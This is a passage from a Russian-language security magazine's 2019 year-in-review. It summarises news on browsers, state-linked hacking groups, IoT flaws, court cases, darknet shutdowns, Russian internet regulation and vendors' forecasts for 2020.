  дили утечку KYC‐данных и предложили воз награждение в размере до 25 BTC
  за любую информацию, которая поможет идентифицировать неизвес тного
  вымогателя и передать его в руки пра воохранитель ных органов.





 СОФТ
  В Chrome заработал встроенный блокировщик рекламы, и разработчики
  Chromium вносят тревожные изменения в код. Из‐за этого работа дру гих бло‐
  кировщиков и защитных расширений оказалась под большим вопросом.
     Разработчики Opera, Brave и Vivaldi официально заявили, что не намерены
  поддерживать взятый Google курс на борь бу с блокировщиками.
    На фоне шквала критики, обрушившегося на компанию Google, довольно
  интересно выглядит ситуация, сло жившаяся вокруг компании Apple. Дело
   в том, что Apple точно так же ограничила работу бло кировщиков и дру гих рас‐
  ширений в Safari, однако никто не обратил внимания на это и не возмутился.
     Представите ли Агентства национальной безопасности США объ явили
  об открытии исходных кодов Ghidra — инс трумента, который сами спецслуж‐
  бы применяют для обратного инжинирин га уже око ло двад цати лет. Напомню,
   что широкая общественность узна ла о Ghidra в 2017  году, благодаря
  документам Vault7, опуб ликованным WikiLeaks. Впрочем, до этого факт сущес‐
   твования Ghidra тоже не был засекречен. Мы посвятили изу чению Ghidra нес‐
   колько статей.
    Выяснилось, что каждое пятое бесплат ное VPN‐при ложе ние для Android
  из числа 150 самых популярных в катало ге Google Play может представлять
  опасность для пользователей.
    Иссле дователи из AV‐Comparatives изучили 250 популярных защитных
  приложений из официального катало га Google Play и пришли к неутешитель‐
  ным выводам: почти две трети антивиру сов для Android не выполняют заяв‐
  ленных в их рекламе функций. Хуже того, порой такие приложения называют
  мал варью сами себя, не «видят» нас тоящих угроз и, по сути, не делают ничего
  полезного вовсе.
     Chrome и Firefox вклю чили для мно гих пользователей протокол DNS‐over‐
  HTTPS (DoH) и проводят тестирование. Вся суть нового протокола отражена
   в его названии: он отправляет DNS‐зап росы на специальные DoH‐совмести‐
  мые DNS‐серверы через зашифрованное соеди нение HTTPS, но не исполь‐
   зует  классические незашифрованные  UDP‐запросы.  Кроме  того, DoH
  работает на уровне приложений, а не на уровне ОС. По сути, он скрывает
  DNS‐запросы внутри обычного потока HTTPS‐данных.
     Разработчики браузера Vivaldi признали, что с релиза версии 2.10 их бра‐
  узер маскируется под Chrome, что бы пользователи могли получить доступ
   к сайтам, которые  в противном  случае неспра ведливо  их блокиру ют.
  Это будет реализовано путем замены user‐agent. Девелоперы отме чают, что
  некоторые блокируют Vivaldi из‐за нежелания разбираться с возможными
  ошибками, тогда как крупные технологичес кие компании, такие как Google
  и Microsoft, уже давно саботируют подоб ным обра зом работу конкурентов.





 APT
  В феврале 2019 года ана литики компании Check Point предупредили, что
  северокорейская хак‐группа Lazarus (она же HIDDEN COBRA, Guardians
   of Peace, ZINC, NICKEL ACADEMY и APT38) на чала атаковать российские ком‐
  пании. Исследователи уверяли, что это бес прецедентный и первый зафик‐
  сированный случай, так как чаще всего Lazarus атакуют цели в Южной Корее
  и Японии.
      Хак‐группа Winnti, впервые обнаруженная еще в 2011 году, по‐прежнему
   активна, и ее целями ста новятся игровые компании, из‐за чего происходят
   атаки на цепочку поставок. По информации исследователей ESET, злоумыш‐
  ленники успешно инфицировали бэкдорами как минимум две игры и одну
  игровую платформу, из‐за чего пострадали десят ки или даже сотни тысяч
  пользователей.
     Эксперты компании FireEye заметили, что хак‐группа FIN6 сменила тактику.
  Теперь вместо исполь зования привычной PoS‐малвари Trinity злоумышленни‐
   ки стали применять в сво их операциях и шифровальщики Ryuk и LockerGoga.
    Специалисты «Лаборатории Касперского» рассказали об интересном
  шпионском фреймворке TajMahal, обнаруженном осенью 2018 года в ходе
   атаки на дипломатическую организа цию, принадлежащую одной из стран
  Центральной Азии. В арсенал зло умышленников входят бэкдоры, лоадеры,
  оркестраторы, средства для записи аудио, перехвата нажатий клавиш, изоб‐
  ражения с экрана и камер, хищения документов и криптографических ключей
  и многое другое.
     Некто Lab Dookhtegan опуб ликовал в открытом доступе инстру менты иран‐
  ской APT34, а также информа цию о жертвах хакеров и сотрудни ках Минис‐
  терства информации и национальной безопасности Ирана, которые якобы
  связаны с операциями группировки. Эти «сливы» данных продол жились поз‐
  же: в даркнете и в Telegram была опубликована информация о деятельности
   групп MuddyWater и Rana Institute, а затем выложен еще один инс трумент,
  принадлежащий APT34, — утилита Jason.
    Даже после ареста лидера группировки Fin7 исследователи обнаружили
  несколько новых инцидентов, за которыми стояли учас тники этой хак‐группы.
  Более  того, методы атак группы усложнились. Эксперты полагают, что
   Fin7 могла увеличить число атакующих групп, работа ющих под ее «зонтичным
  брендом», и с боль шой вероятностью про дол жила практику найма сотрудни‐
   ков под видом впол не официального секьюри ти‐вендора.
     Китайская хак‐группа Buckeye (она же APT3, Gothic Panda, TG‐011 и UPS)
  хорошо известна правоохранителям всего мира. Считается, что она активна
   как минимум с 2009  года, связана с Минис терс твом государственной
  безопасности КНР и действу ет через Центр оценки информационных тех‐
  нологий Китая (CNITSEC), а также Центр безопас ности ITSEC в Гуандуне.
  От атак Buckeye страдали такие компании, как Siemens и Trimble. Теперь ком‐
  пания Symantec выяснила крайне интерес ный факт: Buckeye применяла
  известный бэкдор DoublePulsar еще в марте 2016 года, то есть задолго
  до того, как он «утек» у американских спецслужб.
     Эксперт компании NewSky Security Анкит Ануб хав (Ankit Anubhav) обна‐
   ружил, что неизвестная группа иранских хакеров атакует веб‐при ложе ния
  для секвенирования ДНК. Для этой кампании злоумышленники эксплуатируют
  неисправ ленную уязвимость. Неяс но, как именно они намерены исполь‐
   зовать свои бэкдоры. Анубхав допус кает два воз можных сценария. В первом
   случае злоумыш ленники могут попытать ся извлечь хеши секвенирования ДНК
  из БД приложения. Во втором случае злоумышленники могут сделать
  зараженные серверы частью ботнета или исполь зовать shell’ы для установки
  майнеров криптовалюты на взло манные системы.
     Группировка Xenotime, существу ющая как минимум с 2017 года и ответс‐
   твенная за атаки малвари Triton (он же Trisis), вновь активна и «прощупывает»
  энергосети в США и Азиатско‐Тихоокеанском регионе. Злоумышленники
  действуют разными методами, но в целом используют те же тактики, которые
  обычно применяют против нефтегазо вого сектора.
     Группировка  Intrusion  Truth продолжила деанонимизировать китай ских
  «правительственных хакеров». На этот раз об народованы данные о пред‐
  полагаемых членах  APT17.  Intrusion  Truth публику ет свои разоблачения
  и деанонимизирует участников китайских кибершпионских групп уже третий
   раз.
    Специалисты Microsoft Threat Intelligence Center предупредили об изме‐
  нениях в «почерке» известной русскоязычной хак‐груп пы APT28 (она же Fancy
   Bear, Pawn Storm, Strontium, Sofacy, Sednit и Tsar Team). Хакеры все чаще ком‐
  прометируют устрой ства интернета вещей (будь то VoIP‐телефоны, принтеры
  или другие IoT‐девайсы), чтобы проникнуть в корпоративную сеть и там
  переключиться на другие, более значимые цели.
     Аналитики Group‐IB подсчитали, что подтвержденная сумма хищений,
  совершенных  русскоязычной  хак‐груп пой  Silence  с  июня  2016  года
  по июнь 2019 года, составляет не менее 272 миллионов рублей. Жертвами
   Silence ранее становились российские банки, однако в новом отчете фик‐
  сируется значительное рас ширение географии их прес туплений: аналитики
   Group‐IB выявили атаки Silence более чем в 30 странах Европы, Азии и СНГ.
    Обнаруженная в этом году хак‐группа Calypso действует с 2016 года
  и нацеле на на государственные учреждения. В нас тоящее время группа
   активна на территории шести стран: по данным экспертов, от действий груп‐
  пировки уже пострадали организа ции из Индии (34% жертв), Бразилии,
  Казахстана (по 18%), России, Таиланда (по 12%) и Турции (6%). APT‐груп‐
  пировка предположительно имеет азиатские корни и относится к числу китай‐
  скоговорящих.
    Выявлена группировка DarkUniverse, которая упоминалась сре ди данных,
  похищенных у АНБ хакерами из ShadowBrokers.
    Напомню, что в апреле 2017 года хак‐группа ShadowBrokers опубликовала
  очередной дамп данных, похищенных у АНБ. Дамп был назван «Трудности
  перевода» (Lost in Translation) и среди про чего содержал скрипт sigs.py, ищу‐
  щий в скомпрометированной системе следы присутствия 44 различных APT.
  Аналитики «Лаборатории Касперского» обна ружи ли APT, описанную 27‐й
  функцией этого скрипта. Группировку назвали DarkUniverse, сообщается, что
  она   оставалась   незамеченной   по   крайней  мере   восемь   лет
   (с 2009 по 2017 годы).





 IOT
  В преддверии летних Олимпийских игр 2020, которые пройдут в Токио, влас ти
  Японии хотят обезопасить пользовательские устрой ства. Для этого власти
  планируют вторгаться на IoT‐устройства ради улучшения их безопасности.
    Обладатели самозашнуровывающихся кроссовок Nike Adapt BB пожало‐
  вались,  что официальное  приложение  прекратило  работать,  а  после
  обновлений обувь вооб ще перес тала «отвечать». «Спарить» кроссовки с при‐
  ложением не получается, и при обновлении многие стол кнулись с ошибками,
  после которых правый или левый крос совок «превращались в кирпич» и никак
  не реагировали на действия пользователя.
    Более 600 тысяч GPS‐трекеров T8 Mini, производимых китайской IoT‐ком‐
  панией Shenzhen i365‐Tech и применяющихся для мониторинга мес тополо‐
  жения детей, пожилых людей, домашних животных, автомобилей, используют
  пароль 123456. В ито ге зло умышленники могут подслушать раз говоры рядом
  с GPS‐трекером, подделать реальное местоположение устройства, а также
   узнать номер прилагаемой к трекеру SIM‐карты.
      Echobot, новая вариация ботнета Mirai, нацелен на более чем 50 раз‐
  личных уязвимостей и уже ус пел затронуть более 34% компаний по всему
   миру. Особенно активно малварь эксплуати рует проблемы удаленного внед‐
  рения команд (Command Injection Over HTTP). Судя по всему, операторы мал‐
  вари пустили в дело всевоз можные пуб лично доступные эксплоиты для давно
  известных уязвимостей, часть из которых датированы 2010 годом.





ЛЮДИ
  Американские власти не оставили без внимания выход мемуаров Эдварда
  Сноудена, получивших название Permanent Record. Влас ти не попытались
  воспрепятствовать рас простра нению кни ги, вмес то этого Министерство
  юстиции США подало гражданский иск против Сно удена за нарушение сог‐
  лашений о неразглашении, которые тот неког да подписывал с АНБ и ЦРУ.
  Минюст не пытался блокировать рас пространение самой книги, но попросил
  суд передать властям все средс тва, вырученные от ее продаж.
    В декабре 2019 года федеральный суд в Вирджи нии вы нес решение:
   судья согласился с мнением американских влас тей и счел, что Эдвард Сно‐
  уден действительно нарушил соглашения с АНБ и ЦРУ, а значит, не имеет
  права зарабатывать на авто биографии.
     Брайан Эктон (Brian Acton), один из сооснователей мессенджера What‐
   sApp, теперь принадлежащего компании Facebook, продолжает выс казывать‐
  ся о социальной сети в крайне негативном ключе. Эктон покинул компанию
  еще в 2017 году, незадолго до старта монетизации мессендже ра. И во время
   лекции в Стэнфордском университете он расска зывал о своем решении про‐
   дать мессенджер Facebook и в очередной раз призвал соб равшихся удалить
  свои аккаунты в социальной сети. Дело в том, что Эктон убежден: для Face‐
  book на первом месте сто ит вовсе не приватность пользователей, а монети‐
  зация продуктов.


                                        Продолжение статьи →
← Начало статьи





   Также с критикой в адрес WhatsApp выс тупил основатель Telegram Павел
  Дуров. В конце года в мессенджере нашли и устранили критическую ошиб ку,
  при помощи которой злоумыш ленники могли удаленно скомпрометировать
  устройство и похитить защищен ные сооб щения чата и файлы. Дуров еще в
  мае текуще го года предска зывал, что в WhatsApp продол жат находить бэк‐
  доры, и, по его мнению, мес сенджеру определенно нельзя доверять.
     «WhatsApp не толь ко не защищает ваши сообщения, но и постоянно
  используется как троянский конь для слежки за вашими фотографиями
  и сообщениями, которые к WhatsApp не отно сят ся», — пишет Дуров и добав‐
   ляет, что Facebook давно сотрудничает со спецслужбами и следит за людьми.
    Подошло к концу громкое судебное разбирательство, о котором мы
  писали неоднократно. В центре скандала оказался 25‐летний бри танский
  ИБ‐специалист  Маркус  Хатчинс,  также  известный  как  MalwareTech.
  В 2017 году именно он об наружил в коде WannaCry аварийный «стоп‐кран»
  и остановил распространение малвари, положив конец эпидемии.
     Хатчинса арестовали еще в 2017 году, ког да он прилетел в США на кон‐
  ференции Black Hat и DEF CON. Тогда ФБР обвинило специалис та в соз‐
  дании и распространении банковского трояна Kronos в 2014–2015 годах.
  Судья приговорил Маркуса Хатчинса к сроку заключения, равному тому,
  который тот уже провел под стражей, а также обя зал иссле дователя в течение
  года находиться под надзором правоохраните лей. Штрафов на специалиста
  не наложили и разрешили вернуть ся на родину, в Великобританию (вероятно,
   в будущем въезд в США для Хатчинса будет закрыт из‐за его судимости). Так‐
  же судья посоветовал юристам эксперта рас смотреть возможность про‐
  шения о полном помиловании. Адвокаты наз вали это беспре цедентным
  и пообещали заняться этим вопросом.





 RIP
  Представители Microsoft сами призывают отка зать ся от использования Inter‐
   net Explorer. По их словам, это не полноценный бра узер, а продукт для кор‐
  поративных клиентов, которым приходится иметь дело с legacy‐решени ями.
     Совместная операция ФБР и пра воохранительных органов ряда европей‐
   ских стран привела к закрытию тор говой пло щадки xDedic, на которой
  с 2016 года про давали доступ к взло манным серверам со все го мира.
    Операторы защищенного почтового сервиса VFEmail сообщили, что их
  ресурсу пришел конец и он вряд ли снова заработает в пол ном объ еме. Дело
   в том, что 11 февраля 2019 года неиз вес тные злоумышленники проникли
  на американские серверы проекта и уничтожили там все данные, до которых
   только смогли доб рать ся. Взломщики букваль но отформатировали диски
  на всех машинах, и в результате были потеряны все виртуальные машины, все
  бэкапы и файловый сервер.
     Разработчики сервиса  Coinhive, который задумывался  как легальная
  и простая альтернатива классичес кой баннерной рекламе, но приобрел
  огромную популярность среди прес тупни ков, со общили о закрытии своего
  проекта. Администрация Coinhive признается, что после хардфорка Monero
  хешрейт упал более чем на 50%. Также на решение разработчиков Coinhive
  повлиял общий «обвал» крип товалютного рын ка, так как XMR потеряла око‐
  ло 85% стоимости по сравнению с 2018 годом. Сервис прекратил работу
   в марте 2019 года.
    Один из круп нейших маркетплейсов в даркнете — Dream Market объявил
  о закрытии в конце апреля. На главной стра нице появилось лаконичное сооб‐
  щение о том, что все сервисы перейдут к некой «партнерской компании», чей
   сайт пока даже не зарабо тал. Один из модераторов ресурса писал, что сайт
  постоянно страдал от серьезных DDoS‐атак (у Dream Market дей ствительно
  наблюдались  технические проблемы). Пос ле продол жительного DDoS’а
   от  операторов  маркетплейса  и  вовсе  потребовали  за  прекращение
   атак 400 тысяч дол ларов США, но те отка зались пла тить. В итоге было при‐
   нято решение передать ресурс «партнерской компании».
     Конец настал и для еще одного крайне популярного в даркне те маркет‐
  плейса — Wall Street Market (WSM). Администрация торговой площадки прис‐
  воила около 30 миллионов долларов пользователь ских средств и скрылась.
  Пострадавшими в данном случае ста ли торговцы самыми разными незакон‐
  ными товарами, вклю чая наркотики, ору жие и малварь.
     Правоохранительные органы со общили о закрытии Wall Street Market и Val‐
   halla (он же Silkkitie). Можно только гадать, успели администраторы Wall Street
   Market скрыться с деньгами пользователей, как было замечено выше,
  или экзит‐скам все же завершился арестом операторов площадки, а WSM
   какое‐то вре мя находился под контролем правоохраните лей.
    Нидерландское управление по борь бе с финансовыми преступле ниями
   (FIOD), а также Европол и правоохранители Люксембурга в результате сов‐
  местной операции закрыли сервис‐микшер Bestmixer.io, занимавшийся отмы‐
  ванием криптовалю ты. Bestmixer, запус тивший ся в мае 2018 года, был одним
  из трех крупнейших в мире микшер‐сервисов и предлагал свои услуги
  по отмыванию Bitcoin, Bitcoin cash и Litecoin. За год работы через сайт прош‐
  ло примерно 27 тысяч BTC, то есть порядка 200 миллионов долларов США,
  а его операторы получали около 600 тысяч в месяц.
     Давно утратившая популярность соци альная сеть MySpace потеряла все
  данные пользователей, загруженные с 2003 по 2015 годы (включая музыку,
  фотографии и видео). Во время перено са информа ции на новые серверы
  данные были повреждены, и вос становить их невоз можно. Очевидно, бэкапов
   у компании не было.





  Об уходе от дел этим летом объявили операторы RaaS (Ransomware‐as‐a‐
   Service) GandCrab. Через RaaS‐портал GandCrab злоумышленни ки приобре‐
   тали доступ к вымогателю GandCrab, а затем распространяли опасную мал‐
  варь посредством спама, наборов экспло итов и подоб ного. Когда жертвы
  шифровальщика  платили  выкуп  прес тупни кам,  разработчики  GandCrab
  получали небольшую комиссию, тогда как остальная часть денег оседала
   в руках «арендаторов» вредоноса.
    В своем послании разработчики GandCrab похвастались, что собираются
   «уйти на заслуженную пенсию», так как в общей слож ности выкупы принесли
  преступникам более 2 миллиардов долларов и операторы получали пример‐
  но 2,5 миллиона дол ларов в неделю (150 миллионов долларов в год). Экспер‐
  ты в области безопасности сошлись во мнении, что эти цифры вряд ли соот‐
   ветствуют действительности.
     Вскоре после это го ИБ‐специалис ты предста вили новые инс трументы
  для дешифровки данных, постра давших в резуль тате атак любых версий
  GandCrab.
     Прекратило работу пиратское стриминговое приложение CotoMovies.
  Это решение было связано с давлением со стороны компаний, снявших такие
  ленты, как «Хеллбой» и «Падение ангела». Разработ чик CotoMovies при нес
  публичные извинения создателям фильмов и дру гим правообладателям
  на домашней странице проекта. Оператор при ложения пишет, что извлек
  уроки из случившегося и теперь понимает, какой ущерб могут нанес ти пират‐
  ские приложе ния. Он пообещал не нарушать ничь их авторских прав и призвал
  пользователей сделать то же самое.
     Пользователи, разумеется, были разоча рова ны, но, похоже, в будущем их
   могут ждать и более неприятные эмоции, связанные с CotoMovies. Дело
   в том, что создатель приложения согласился передать пользовательские
  данные и сообщения правообладателям, чтобы те смогли добиться соб‐
  людения законов и следить за своей ценной интеллектуальной собствен‐
   ностью.
    Немецкие  правоох ранители  закрыли  «пуленепробиваемый»  хос тинг,
  который базировался в бывшем военном бункере НАТО, расположенном
   в Западной Германии. Речь идет о небезызвестном интернет‐провайдере
  CB3ROB и веб‐хостинге Cyberbunker. Гла вой это го предпри ятия выступает
  Свен Олаф Камфуис  (Sven  Olaf  Kamphuis), ранее опи сывавший себя
   как «министра телекоммуникаций и инос транных дел Республики Кибер‐
   бункер». На своей странице в Facebook Камфуис выражает крайнее воз‐
  мущение происходящим, так как по немецким законам интернет‐провайдеры
  не могут нести ответственность за действия своих клиентов, если только, гру‐
  бо говоря, не вступают в сговор с ними.





 РУНЕТ
  16 апреля 2019 года Госдума одоб рила в треть ем чтении законопроект, нап‐
  равленный на «защиту устойчивой работы интернета в России в слу чае воз‐
  никновения угрозы его функционирования из‐за рубежа». Документ быстро
   стал известен как законопроект о «суверенном интернете» или «об изоляции
   Рунета», он предусматривал внесение поправок в законы «О связи» и «Об
  информации, информационных технологи ях и о защите информации».
    Компании Facebook и Twitter по‐прежнему не локализовали базы данных
  пользователей в России, то есть не перенесли данные российских поль‐
  зователей на территорию РФ. В связи с этим представите ли Рос комнадзора
  направили компаниям уведомления о необходимости соблюдения закона, и,
   хотя надзорное ведомство получило ответы от Facebook и Twitter, они не удов‐
  летворили представите лей Рос комнадзора, в частности из‐за того, что «не
  содержали конкретики». В итоге в апреле текущего года социальные сети бы‐
  ли оштрафованы на 3000 рублей каждая.
     Роскомнадзор потребовал от ряда крупных VPN‐сервисов подключиться
   к государственной информа ционной системе (ФГИС). Напомню, что ФГИС
  содержит сведения о ресурсах, дос туп к которым должен быть заблокирован
  на территории РФ. В свою очередь, закон о жес ткой регуляции анонимай‐
  зеров и VPN, которые могут быть использованы для обхода блокировок (276‐
  ФЗ), вступил в силу еще в 2018 году. Многие компании заявили, что
  не намерены выпол нять требования Рос комнадзора.
    Еще в конце июня 2019 года глава РКН Александр Жаров выражал
  недовольство тем, что в мае филь трация зап рещенного контента в Google
   упала до уровня около 67,5–70%, хотя еще в апреле из поисковой выдачи
  удалялось 80% запрещенного контента. В итоге в июле 2019 года стало
  известно, что Роскомнадзор оштра фовал компанию Google на 700 тысяч руб‐
   лей, так как «компания не выполнила требова ния закона „Об информации…“
  по исключению из результатов поисковой выдачи ссылок на интернет‐ресур‐
  сы с противоправной информацией».





  Совет Федерации одоб рил поправки в федеральный закон «О национальной
  платежной системе» и федеральный закон «О Центральном банке Россий‐
  ской Федерации (Банке Рос сии)». Внесенные изменения подразуме вают, что
  пользователи Яндекс.Денег, «QIWI Кошелька», WebMoney, PayPal, VK Pay
  и других анонимных электронных кошельков больше не смогут пополнять их
  без идентификации личности. Таким образом, пополнение кошельков налич‐
  ными, через платежные терминалы и офисы операторов сотовой связи, скоро
  останется в прошлом.
     «Билайн», «МегаФон» и Tele2 совмес тно с Россвязью уже готовятся к вве‐
  дению идентификации по IMEI, что должно огра ничить серый импорт гад‐
  жетов и помешать мошенникам использовать укра денные телефоны. В Рос‐
  связи рассказали, что подготовка к введению идентификации по IMEI предус‐
  матривает запуск пилотного проекта, который поз волит протестировать раз‐
  личные бизнес‐процессы. Площадкой для этого проекта станет подведомс‐
   твенный Россвязи Центральный научно‐исследовательский институт свя зи
  (ЦНИИС), именно он управляет центральной базой данных IMEI.
     2 декабря 2019 года президент РФ Владимир Путин подписал закон,
  который вступит в силу с 1 июля 2020 года и обяжет производителей пре дус‐
   танавливать российские приложения на смартфо ны и дру гие устройства,
  предназначенные для продажи на территории нашей страны (компьютеры,
  телевизоры с функцией Smart TV и прочие).
     Российская ассоциация торговых компаний и товаропроизводите лей
   электробытовой и компьютерной техники (РАТЭК) обращалась к президенту
  с просьбой откло нить законопроект. По мнению пред принимателей, при‐
  менение закона окажет негативное воздействие на отрасль, ухудшит кон‐
  курентную ситуацию в сфере рос сийского софта, а также приведет к ее
  монополизации.





 ПРОГНОЗЫ
  Теперь пора уделить внимание прогнозам круп ных ИБ‐компаний и узнать,
  каким они видят грядущий 2020 год и какие тренды пред сказывают.


  Group-IB
  Самой пугающей тенденцией 2019 года эксперты компании назвали исполь‐
  зование кибероружия в открытых военных операциях. Аналитики счи тают, что
  тема кибербезопасности вышла на первый план в мировой политической
  повестке. Блэкаут в Венесу эле, откры тые военные операции в кибер‐
  пространстве между конфликтующими государствами, а также нарушение
  работы интернета в отдельно взя тых стра нах — это крайне опасные пре‐
  цеденты, способ ные привести к социальному и экономическому ущербу,
  а также дестабилизации ситуации в государс твах.
    В целом иссле дователи отслежива ют десятки киберкриминальных групп
  и  прогосударственных  ата кующих,  целью  которых  является  шпионаж
  и саботаж. За иссле дуемый период были активны 38 групп, спонсируемых
  государствами, из них семь — новые.



         «Конфликт между государс тва ми приобрел новые фор мы, и киберак-
         тивность игра ет ведущую роль в этом противос тоянии. Фокус иссле-
        дова телей во всем мире пос тепенно сме щается с финансово мотиви-
        рованных хакер ских  групп, зараба тыва ющих деньги взломом  раз-
        личных организа ций, в сторону прогосу дарс твенных ата кующих. Их
         активность оста ется незаме ченной годами, нем ногие пре цеденты ста-
         новятся дос тоянием общес твенности, но большинс тво из них говорит
        о том, что объекты критичес кой инфраструк туры многих стран уже
        ском прометирова ны. Это говорит о том, что мир ное сущес твование
        больше невоз можно в отры ве от кибер безопас ности: этот фак тор
        не может игнорировать ни одно государс тво, ни одна кор порация,
        ни один человек», — говорит Дмитрий Волков, техничес кий дирек тор,
         руководитель Threat Intelligence, соос нователь Group-IB.


  ESET
  В начале 2019 года одним из трендов был рост случаев криптодже кинга —
  скрытого майнинга криптовалю ты на зараженных устройствах, а также рост
  числа кибератак с исполь зованием умных гаджетов. На данный момент один
  из главных трендов — развитие и повсеместное внедрение машинного обу‐
   чения.  Хотя  до  создания  полноценного  искусственного  интеллекта
  еще далеко, машинное обучение ста новится одним из ключевых технологи‐
  ческих достижений современности.
     Эксперты ESET отмечают, что очень впечатляющими темпами развива‐
  ются дипфейки — технологии, позволяющие при помощи искусственного
  интеллекта подделывать голоса и лица людей. По мнению аналитиков ком‐
   пании, имен но эта технология в 2020 году ста нет одной из наиболее востре‐
  бованных среди киберпрес тупников. В будущем дипфей ки могут способство‐
   вать еще более широкому рас пространению фаль шивых новостей, поэтому
  следует  скептически  относиться даже  к самым  реалистичным  видео‐
  или аудиозаписям.
    Еще один тренд 2020 года — соз дание умных зданий и целых умных
   городов. Более чем в 80% новых пос троек исполь зуются элементы интернета
  вещей. При этом эксперты обеспокоены тем, что умные города активно раз‐
  растаются, а  их системы защиты по‐прежнему недостаточно развиты.
  Во многих умных гаджетах нет достаточно надежного протокола аутентифика‐
   ции, а в некоторых и вовсе отсутс тву ет какое‐либо решение для информа‐
  ционной безопасности.


   Positive Technologies
  Эксперты компании считают, что накоп ление проблем ИБ в раз личных сфе рах
  достигает предельной отметки. Аппа рат ные уяз вимос ти пока не нанес ли
  ущерба, однако дальновидные компании ста ли вклю чать в свою модель угроз
   такие проблемы уже сейчас, понимая, что, когда прес тупники научатся экс‐
   плуатировать подоб ные уязвимос ти, защищаться будет уже поздно.
     А вот APT‐атаки, напротив, «отработали» по полной, угрожая не только
  бизнесу, но и государственным учреждениям и объектам инфраструктуры.
    Новости об утечках данных в этом году стали особенно громкими, в том
  числе и потому, что злоумышленники предположительно объеди нили утечки
  прошлых лет в единый массив для торговли на теневом рынке более полными
  цифровыми досье пользователей. Многие технологии име ют свою темную
   сторону, которая может выйти из‐под контроля и стать угрозой для всех.
  С грядущим распространением сетей 5G эксперты связывают возникновение
  новых рисков для телеком‐операторов. Раз витие искусственного интеллекта
  и технологий машинного обучения не только делает жизнь удобнее, но и дает
  мощный толчок для совершенс твования инс трументов взлома, а  также
  для появления новых методов социальной инженерии.


  Avast
  Специалисты Avast считают, что в 2020 году злоумышленни ки будут искать
  новые методы распространения угроз и совершенствовать методы зараже‐
  ния (это могут быть рас сылка вредонос ных писем, кража входящей почты,
  шпионаж, эксплуатация уязвимос тей RDP).



        «Кибер прес тупники все вре мя ищут новые способы, чтобы обойти
         сов ременные решения безопас ности и добраться до конеч ного поль-
         зовате ля. Самое уяз вимое мес то — человек, поэтому злоумыш ленни-
        кам важно, чтобы их письма доходили до жертв и не блокировались
         сис темами безопас ности. Но, пос кольку вре донос ные письма рас-
        сыла ются не пер вый год и многие люди уже зна ют, как они выглядят,
         хакеры стре мятся сде лать их мак симально прав доподобными. Их дей-
         ствительно ста новится все сложнее с ходу обна руживать, а зна чит,
        процент успешных атак повыша ется», — ком ментирует Якуб Крус тек.

   Также эксперты прогнозиру ют, что злоумышленни ки будут пытаться найти
   уязвимости в устрой ствах Apple. Николаос Хри саидос, глава отде ла иссле‐
  дования угроз и защиты для мобильных устройств Avast, уверен, что в сле‐
  дующем году в iOS обнаружат большое количес тво уязвимостей — причем
   как исследователи, так и хакеры. Вредоносные и фей ковые приложения будут
  все чаще попадать в официальные магазины при ложений.
    Ожидается больше атак, нацеленных на умные устройства. Количество
  умных устройств растет, но не все пользователи готовы соблюдать технику
  безопасности при работе с ними. Согласно данным Avast Smart Home Report
   2019, 44% российских умных домов имеют как минимум одно уязвимое
  устройство, которое ставит под угрозу безопас ность всей сети.



        «Умные устройства и физичес кие локации, нап ример умные пар ки,
        которые собира ют данные, очень удобны. Но людям ста новится слож-
        нее контролировать свою приватность в сети. Воз можно, что хакеры
         будут больше инте ресоваться ком паниями, собира ющими данные: так
        они смогут получить больше данных для продажи в дар кне те», — объ-
         ясняет ИБ‑спе циалис тка Анна Широкова.


  «Лаборатория Касперско го»
  Специалисты  компании  называют  2019  год  годом  атак  вымогателей
  на муниципальные службы и отмечают, что эта тенденция, скорее все го, сох‐
  ранится в 2020‐м. Более того, зло умышленники все чаще выбирают своими
  целями организации, которые готовы заплатить зна чительные суммы за вос‐
   становление данных. Исследователи назвали этот метод «целевым вымога‐
   тельством». Подобные атаки ста новят ся все агрессивнее, и возможно, что
  вскоре вместо блокировки файлов злоумышленни ки также начнут угрожать их
  публикацией.
    Операции под ложным флагом давно ста ли важным тактическим элемен‐
  том для многих APT‐групп, и, по мнению экспертов, эта тенденция продол‐
  жится в будущем: преступные группы будут стремиться не только избежать
   установления их авторс тва, но и выставить виноватым кого‐то другого.
  Для данных целей могут, например, использовать ся установленные бэкдоры,
  которые ассоциируются с другими APT‐группировками. Злоумышленники
   могут не только использовать чужой код, но и намеренно сливать свой, чтобы
  им воспользовались другие группировки и тем самым еще больше запутали
  общую картину.
    Ожидают в компании и роста числа атак на инфраструктуру. Так, в пос‐
  ледние годы эксперты наблюдали целый ряд атак на объекты критически важ‐
  ной инфраструктуры, и, как правило, они были связаны с опре деленными
  геополитическими целями. Заражение про мышленных объ ектов пока про‐
  исходит по большей час ти из‐за «традиционных» вре доносных программ,
  но сам факт заражений показывает, какими уяз вимыми могут быть такие
  предприятия. Маловероятно, что целевые атаки на объ екты критически важ‐
  ной инфраструктуры когда‐нибудь ста нут основным полем деятельности
  киберпреступников.  Но  геополитичес кие  конфликты  разворачиваются
  на фоне нарастающего вза имопроникновения физического мира и кибер‐
  мира, и такие кампании предоставляют пра вительствам способ возмездия
  на стыке дипломатии и военных действий.
     Так как виртуальная жизнь пользователей перемес тилась из персональных
  компьютеров  в  мобиль ные  устройства,  некоторые  злоумышленники
   это заметили и быстро принялись раз рабатывать методы атак на новые цели.
     Злоумышленники вкладывают большие день ги в разработку новых тех‐
  нологий и четко понимают, что сейчас практичес ки у каждого в кармане есть
  телефон, а информация на этих устрой ствах представляет ценность. Вряд ли
   это изменится в ближайшем будущем. Интерес но, что в этом году, согласно
  прайс‐листу брокера уязвимостей Zerodium, устой чивые эксплоиты для An‐
   droid стали дороже подоб ных для iOS.
    Мало того что объемы хра нящихся данных пос тоянно рас тут — возникает
  опасность утечек особо чувс твитель ных данных, в частности биометричес ких.
   Также широко обсуждаемые случаи соз дания подделок с помощью ней‐
  росетей (дипфейки) повышают вероятность таких инцидентов, особенно
   в сочетании с менее очевидными аудио‐ и видеовекторами. Не стоит
  забывать о возможности автоматизировать такие методы, а также применить
  ИИ для профилирования жертв и создания таких информационных подделок.
  Эти способы очень похожи на то, как используют социальные сети в ходе
  предвыборной агитации. Эта технология уже применя ется, и эксперты уве‐
  рены, что рано или поздно злоумышленники тоже начнут ее экс плуатировать.


 ОДНОЙ СТРОКОЙ

   Средняя утечка данных обходится компании в 3 920 000 дол ларов


   Facebook — самое скачива емое приложе ние десятилетия


   Попав в сеть, данные банковских карт оказываются в руках злоумыш ленников через два часа


   Пароли password и 123456 по‐прежнему одни из самых популярных


   Влияние майнинговой малвари снизилось на 70%


   Более 60% всей спамерской активнос ти генерируют США, Рос сия и Украина


   Только 5,5% уязвимостей действительно используются для реаль ных атак


